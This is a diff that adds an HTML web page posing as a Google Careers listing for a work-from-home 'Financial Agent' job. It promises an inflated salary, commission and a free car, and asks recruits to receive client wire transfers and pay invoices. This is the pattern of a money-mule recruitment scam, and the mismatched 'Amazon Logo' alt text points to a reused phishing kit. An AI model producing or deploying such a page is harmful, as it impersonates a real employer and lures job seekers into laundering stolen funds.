@@ -1,0 +1,38 @@
+<html>
+
+	<head>
+	     <meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="../maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+		<script src="../code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+		<script src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+		<script src="../maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+		<title> Google Careers </title>
+	</head>
+	
+	<body>
+	
+		<div class="container"><br>
+			<div class="card"><Br>
+		  <img class="card-img-top img-fluid" style="max-width:50%;" src="../careers.google.com/static/images/google-careers-logo.svg" alt="Amazon Logo"><hr>
+		  <div class="card-body">
+			<h5 class="card-title">Financial Agent Position </h5>
+			<p class="card-text">
+				We are very glad to see that you are interested in joining our team. We have a Financial Agent position available, a job that you can do from home, you don`t have to stay in a office, or quit a current job. No previous experience is needed.
+Below you can find your responsibilities and benefits for this position:<br>
+<strong>
+Benefits:</strong><br>
+$5,800 salary / month + 5% commission from each processed payment<br>
+Brand new Toyota Corrola after the first month of probation<br>
+Full health insurance<br>
+Low working hours<br><br>
+<strong>
+Responsibilities:</strong><br>
+Your duty as a financial agent will be to receive and process the payments coming from our clients via bank wire transfer.
+Paying invoices for the company<br><br>
+
+In order to get more info, please click the button below and one of our agents will contact you as soon as possible.
+			</p>
+			<a href="apply.php.html" class="btn btn-primary">Apply now</a>
+		  </div>
+		</div>
+		</div>
